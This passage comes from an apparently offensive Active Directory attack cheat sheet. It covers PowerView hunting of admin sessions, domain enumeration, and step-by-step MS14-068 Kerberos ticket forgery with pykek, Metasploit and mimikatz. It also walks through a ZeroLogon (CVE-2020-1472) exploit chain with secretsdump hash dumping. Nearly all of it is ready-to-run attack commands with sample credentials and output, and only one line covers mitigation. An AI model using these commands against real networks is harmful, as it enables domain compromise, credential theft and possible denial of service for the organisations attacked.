<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="nb">Find-LocalAdminAccess</span> <span class="n">-Verbose</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="c">#Find local admins on all machines of the domain:</span>
<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="nb">Invoke-EnumerateLocalAdmin</span> <span class="n">-Verbose</span>
<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>
<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="c">#Find computers were a Domain Admin OR a specified user has a session</span>
<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="nb">Invoke-UserHunter</span>
<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="nb">Invoke-UserHunter</span> <span class="n">-GroupName</span> <span class="s2">&quot;RDPUsers&quot;</span>
<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="nb">Invoke-UserHunter</span> <span class="n">-Stealth</span>
<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a>
<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="c">#Confirming admin access:</span>
<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="nb">Invoke-UserHunter</span> <span class="n">-CheckAccess</span>
</code></pre></div>
  :heavy_exclamation_mark: <strong>Priv Esc to Domain Admin with User Hunting:</strong> \
  I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt; <br />
  Profit!</li>
</ul>
<p><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView 3.0 Tricks</a></p>
<h3 id="using-ad-module">Using AD Module</h3>
<ul>
<li><strong>Get Current Domain:</strong> <code>Get-ADDomain</code></li>
<li><strong>Enum Other Domains:</strong> <code>Get-ADDomain -Identity &lt;Domain&gt;</code></li>
<li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li>
<li><strong>Get Domain Controlers:</strong> </li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">Get-ADDomainController</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="nb">Get-ADDomainController</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
</code></pre></div>
<ul>
<li><strong>Enumerate Domain Users:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="p">*</span>
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="c">#Get a spesific &quot;string&quot; on a user&#39;s attribute</span>
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="s1">&#39;Description -like &quot;*wtver*&quot;&#39;</span> <span class="n">-Properties</span> <span class="n">Description</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span> <span class="n">Description</span>
</code></pre></div></li>
<li><strong>Enum Domain Computers:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nb">Get-ADGroup</span> <span class="n">-Filter</span> <span class="p">*</span> 
</code></pre></div></li>
<li><strong>Enum Domain Trust:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="nb">Get-ADTrust</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
</code></pre></div></li>
<li><strong>Enum Forest Trust:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">Get-ADForest</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nb">Get-ADForest</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">ForestName</span><span class="p">&gt;</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c">#Domains of Forest Enumeration</span>
<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="p">(</span><span class="nb">Get-ADForest</span><span class="p">).</span><span class="n">Domains</span>
</code></pre></div></li>
<li><strong>Enum Local AppLocker Effective Policy:</strong>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nb">Get-AppLockerPolicy</span> <span class="n">-Effective</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">RuleCollections</span>
</code></pre></div></li>
</ul>
<h3 id="other-interesting-commands">Other Interesting Commands</h3>
<ul>
<li><strong>Find Domain Controllers</strong>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">nslookup</span> <span class="n">domain</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="n">nslookup</span> <span class="n">-type</span><span class="p">=</span><span class="n">srv</span> <span class="n">_ldap</span><span class="p">.</span><span class="n">_tcp</span><span class="p">.</span><span class="n">dc</span><span class="p">.</span><span class="n">_msdcs</span><span class="p">.&lt;</span><span class="n">domain</span><span class="p">&gt;.</span><span class="n">com</span>
<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="n">nltest</span> <span class="p">/</span><span class="n">dclist</span><span class="p">:</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="nb">Get-ADDomainController</span> <span class="n">-filter</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">name</span>
<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="n">gpresult</span> <span class="p">/</span><span class="nb">r</span>
<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="nv">$Env:LOGONSERVER</span> 
<a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="nb">echo </span><span class="k">%</span><span class="n">LOGONSERVER</span><span class="p">%</span>
</code></pre></div></li>
</ul>
<h2 id="from-cve-to-system-shell-on-dc">From CVE to SYSTEM shell on DC</h2>
<blockquote>
<p>Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a "normal user" shell on the DC you can also try to elevate your privileges using one of the methods listed in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">Windows - Privilege Escalation</a></p>
</blockquote>
<h3 id="ms14-068-checksum-validation">MS14-068 Checksum Validation</h3>
<p>This exploit require to know the user SID, you can use <code>rpcclient</code> to remotely get it or <code>wmi</code> if you have an access on the machine.</p>
<ul>
<li>RPCClient
  <div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">rpcclient</span> <span class="p">$&gt;</span> <span class="n">lookupnames</span> <span class="n">john</span><span class="p">.</span><span class="n">smith</span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="n">john</span><span class="p">.</span><span class="n">smith</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2923581646</span><span class="p">-</span><span class="n">3335815371</span><span class="p">-</span><span class="n">2872905324</span><span class="p">-</span><span class="n">1107</span> <span class="p">(</span><span class="n">User</span><span class="p">:</span> <span class="n">1</span><span class="p">)</span>
</code></pre></div></li>
<li>WMI
  <div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">wmic</span> <span class="n">useraccount</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">sid</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="n">Administrator</span>  <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3415849876</span><span class="p">-</span><span class="n">833628785</span><span class="p">-</span><span class="n">5197346142</span><span class="p">-</span><span class="n">500</span>   
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="n">Guest</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3415849876</span><span class="p">-</span><span class="n">833628785</span><span class="p">-</span><span class="n">5197346142</span><span class="p">-</span><span class="n">501</span>   
<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="n">Administrator</span>  <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">297520375</span><span class="p">-</span><span class="n">2634728305</span><span class="p">-</span><span class="n">5197346142</span><span class="p">-</span><span class="n">500</span>   
<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="n">Guest</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">297520375</span><span class="p">-</span><span class="n">2634728305</span><span class="p">-</span><span class="n">5197346142</span><span class="p">-</span><span class="n">501</span>   
<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="n">krbtgt</span>         <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">297520375</span><span class="p">-</span><span class="n">2634728305</span><span class="p">-</span><span class="n">5197346142</span><span class="p">-</span><span class="n">502</span>   
<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="n">lambda</span>         <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">297520375</span><span class="p">-</span><span class="n">2634728305</span><span class="p">-</span><span class="n">5197346142</span><span class="p">-</span><span class="n">1110</span> 
</code></pre></div></li>
<li>Powerview
  <div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nb">Convert-NameToSid</span> <span class="n">high-sec-corp</span><span class="p">.</span><span class="n">localkrbtgt</span>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2941561648</span><span class="p">-</span><span class="n">383941485</span><span class="p">-</span><span class="n">1389968811</span><span class="p">-</span><span class="n">502</span>
</code></pre></div></li>
<li>CrackMapExec: <code>crackmapexec ldap DC1.lab.local -u username -p password -k --get-sid</code>  </li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>Doc:<span class="w"> </span>https://github.com/gentilkiwi/kekeo/wiki/ms14068
</code></pre></div>
<p>Generate a ticket with <code>metasploit</code> or <code>pykek</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">Metasploit</span><span class="p">:</span> <span class="n">auxiliary</span><span class="p">/</span><span class="n">admin</span><span class="p">/</span><span class="n">kerberos</span><span class="p">/</span><span class="n">ms14_068_kerberos_checksum</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>   <span class="n">Name</span>      <span class="n">Current</span> <span class="n">Setting</span>                                <span class="n">Required</span>  <span class="n">Description</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>   <span class="p">----</span>      <span class="p">---------------</span>                                <span class="p">--------</span>  <span class="p">-----------</span>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>   <span class="n">DOMAIN</span>    <span class="n">LABDOMAIN</span><span class="p">.</span><span class="n">LOCAL</span>                                <span class="n">yes</span>       <span class="n">The</span> <span class="n">Domain</span> <span class="p">(</span><span class="n">upper</span> <span class="n">case</span><span class="p">)</span> <span class="n">Ex</span><span class="p">:</span> <span class="n">DEMO</span><span class="p">.</span><span class="n">LOCAL</span>
<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>   <span class="n">PASSWORD</span>  <span class="n">P</span><span class="nv">@ssw0rd</span>                                       <span class="n">yes</span>       <span class="n">The</span> <span class="n">Domain</span> <span class="n">User</span> <span class="n">password</span>
<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>   <span class="n">RHOSTS</span>    <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>                                    <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">address</span> <span class="n">range</span> <span class="n">or</span> <span class="n">CIDR</span> <span class="n">identifier</span>
<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>   <span class="n">RPORT</span>     <span class="n">88</span>                                             <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span>
<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>   <span class="n">Timeout</span>   <span class="n">10</span>                                             <span class="n">yes</span>       <span class="n">The</span> <span class="n">TCP</span> <span class="n">timeout</span> <span class="n">to</span> <span class="n">establish</span> <span class="n">connection</span> <span class="n">and</span> <span class="n">read</span> <span class="n">data</span>
<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>   <span class="n">USER</span>      <span class="n">lambda</span>                                         <span class="n">yes</span>       <span class="n">The</span> <span class="n">Domain</span> <span class="n">User</span>
<a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a>   <span class="n">USER_SID</span>  <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">297520375</span><span class="p">-</span><span class="n">2634728305</span><span class="p">-</span><span class="n">5197346142</span><span class="p">-</span><span class="n">1106</span>  <span class="n">yes</span>       <span class="n">The</span> <span class="n">Domain</span> <span class="n">User</span> <span class="n">SID</span><span class="p">,</span> <span class="n">Ex</span><span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1755879683</span><span class="p">-</span><span class="n">3641577184</span><span class="p">-</span><span class="n">3486455962</span><span class="p">-</span><span class="n">1000</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c"># Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</span>
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">SecWiki</span><span class="p">/</span><span class="n">windows-kernel-exploits</span>
<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="p">$</span> <span class="n">python</span> <span class="p">./</span><span class="n">ms14</span><span class="p">-</span><span class="n">068</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">userName</span><span class="p">&gt;@&lt;</span><span class="n">domainName</span><span class="p">&gt;</span> <span class="n">-s</span> <span class="p">&lt;</span><span class="n">userSid</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">domainControlerAddr</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">clearPassword</span><span class="p">&gt;</span>
<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="p">$</span> <span class="n">python</span> <span class="p">./</span><span class="n">ms14</span><span class="p">-</span><span class="n">068</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">darthsidious</span><span class="nv">@lab</span><span class="p">.</span><span class="n">adsecurity</span><span class="p">.</span><span class="n">org</span> <span class="n">-p</span> <span class="n">TheEmperor99</span><span class="p">!</span> <span class="n">-s</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1473643419</span><span class="p">-</span><span class="n">774954089</span><span class="p">-</span><span class="n">2222329127</span><span class="p">-</span><span class="n">1110</span> <span class="n">-d</span> <span class="n">adsdc02</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">adsecurity</span><span class="p">.</span><span class="n">org</span>
<a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="p">$</span> <span class="n">python</span> <span class="p">./</span><span class="n">ms14</span><span class="p">-</span><span class="n">068</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">john</span><span class="p">.</span><span class="n">smith</span><span class="nv">@pwn3d</span><span class="p">.</span><span class="n">local</span> <span class="n">-s</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2923581646</span><span class="p">-</span><span class="n">3335815371</span><span class="p">-</span><span class="n">2872905324</span><span class="p">-</span><span class="n">1107</span> <span class="n">-d</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">115</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="p">$</span> <span class="n">python</span> <span class="n">ms14</span><span class="p">-</span><span class="n">068</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">user01</span><span class="nv">@metasploitable</span><span class="p">.</span><span class="n">local</span> <span class="n">-d</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span> <span class="n">-p</span> <span class="n">Password1</span> <span class="n">-s</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2928836948</span><span class="p">-</span><span class="n">3642677517</span><span class="p">-</span><span class="n">2073454066</span>
<a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="p">-</span><span class="n">1105</span>
<a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>  <span class="p">[+]</span> <span class="n">Building</span> <span class="n">AS-REQ</span> <span class="k">for</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
<a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>  <span class="p">[+]</span> <span class="n">Sending</span> <span class="n">AS-REQ</span> <span class="n">to</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
<a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>  <span class="p">[+]</span> <span class="n">Receiving</span> <span class="n">AS-REP</span> <span class="n">from</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
<a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a>  <span class="p">[+]</span> <span class="n">Parsing</span> <span class="n">AS-REP</span> <span class="n">from</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
<a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>  <span class="p">[+]</span> <span class="n">Building</span> <span class="n">TGS-REQ</span> <span class="k">for</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
<a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a>  <span class="p">[+]</span> <span class="n">Sending</span> <span class="n">TGS-REQ</span> <span class="n">to</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
<a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a>  <span class="p">[+]</span> <span class="n">Receiving</span> <span class="n">TGS-REP</span> <span class="n">from</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
<a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a>  <span class="p">[+]</span> <span class="n">Parsing</span> <span class="n">TGS-REP</span> <span class="n">from</span> <span class="n">msfdc01</span><span class="p">.</span><span class="n">metasploitable</span><span class="p">.</span><span class="n">local</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
<a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a>  <span class="p">[+]</span> <span class="n">Creating</span> <span class="n">ccache</span> <span class="n">file</span> <span class="s1">&#39;TGT_user01@metasploitable.local.ccache&#39;</span><span class="p">...</span> <span class="n">Done</span><span class="p">!</span>
</code></pre></div>
<p>Then use <code>mimikatz</code> to load the ticket.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache&quot;</span>
</code></pre></div>
<h4 id="mitigations">Mitigations</h4>
<ul>
<li>Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780</li>
</ul>
<h3 id="zerologon">ZeroLogon</h3>
<blockquote>
<p>CVE-2020-1472</p>
</blockquote>
<p>White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055</p>
<p>Exploit steps from the white paper</p>
<ol>
<li>Spoofing the client credential</li>
<li>Disabling signing and sealing</li>
<li>Spoofing a call</li>
<li>Changing a computer's AD password to null</li>
<li>From password change to domain admin</li>
<li>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> reset the computer's AD password in a proper way to avoid any Deny of Service</p>
</li>
<li>
<p><code>cve-2020-1472-exploit.py</code> - Python script from <a href="https://github.com/dirkjanm">dirkjanm</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>  <span class="c"># Check (https://github.com/SecuraBV/CVE-2020-1472)</span>
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>  <span class="n">proxychains</span> <span class="n">python3</span> <span class="n">zerologon_tester</span><span class="p">.</span><span class="n">py</span> <span class="n">DC01</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">5</span>
<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">dirkjanm</span><span class="p">/</span><span class="n">CVE</span><span class="p">-</span><span class="n">2020</span><span class="p">-</span><span class="n">1472</span><span class="p">.</span><span class="n">git</span>
<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>
<a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="c"># Activate a virtual env to install impacket</span>
<a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">-m</span> <span class="n">venv</span> <span class="n">venv</span>
<a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a><span class="p">$</span> <span class="n">source</span> <span class="n">venv</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">activate</span>
<a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a><span class="p">$</span> <span class="n">pip3</span> <span class="n">install</span> <span class="p">.</span>
<a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a>
<a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a><span class="c"># Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)</span>
<a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a><span class="n">proxychains</span> <span class="n">python3</span> <span class="n">cve</span><span class="p">-</span><span class="n">2020</span><span class="p">-</span><span class="n">1472-exploit</span><span class="p">.</span><span class="n">py</span> <span class="n">DC01</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">5</span>
<a id="__codelineno-42-13" name="__codelineno-42-13" href="#__codelineno-42-13"></a>
<a id="__codelineno-42-14" name="__codelineno-42-14" href="#__codelineno-42-14"></a><span class="c"># Find the old NT hash of the DC</span>
<a id="__codelineno-42-15" name="__codelineno-42-15" href="#__codelineno-42-15"></a><span class="n">proxychains</span> <span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-history</span> <span class="n">-just-dc-user</span> <span class="s1">&#39;DC01$&#39;</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span> <span class="s1">&#39;CORP/DC01$@DC01.CORP.LOCAL&#39;</span>
<a id="__codelineno-42-16" name="__codelineno-42-16" href="#__codelineno-42-16"></a>
<a id="__codelineno-42-17" name="__codelineno-42-17" href="#__codelineno-42-17"></a><span class="c"># Restore password from secretsdump </span>
<a id="__codelineno-42-18" name="__codelineno-42-18" href="#__codelineno-42-18"></a><span class="c"># secretsdump will automatically dump the plaintext machine password (hex encoded) </span>
<a id="__codelineno-42-19" name="__codelineno-42-19" href="#__codelineno-42-19"></a><span class="c"># when dumping the local registry secrets on the newest version</span>
<a id="__codelineno-42-20" name="__codelineno-42-20" href="#__codelineno-42-20"></a><span class="n">python</span> <span class="n">restorepassword</span><span class="p">.</span><span class="n">py</span> <span class="n">CORP</span><span class="p">/</span><span class="n">DC01</span><span class="nv">@DC01</span><span class="p">.</span><span class="n">CORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-target-ip</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">5</span> <span class="n">-hexpass</span> <span class="n">e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3</span>
<a id="__codelineno-42-21" name="__codelineno-42-21" href="#__codelineno-42-21"></a><span class="n">deactivate</span>
</code></pre></div></p>
</li>
<li>
<p><code>nccfsas</code> - .NET binary for Cobalt Strike's execute-assembly
  <div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">nccgroup</span><span class="p">/</span><span class="n">nccfsas</span>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="c"># Check</span>
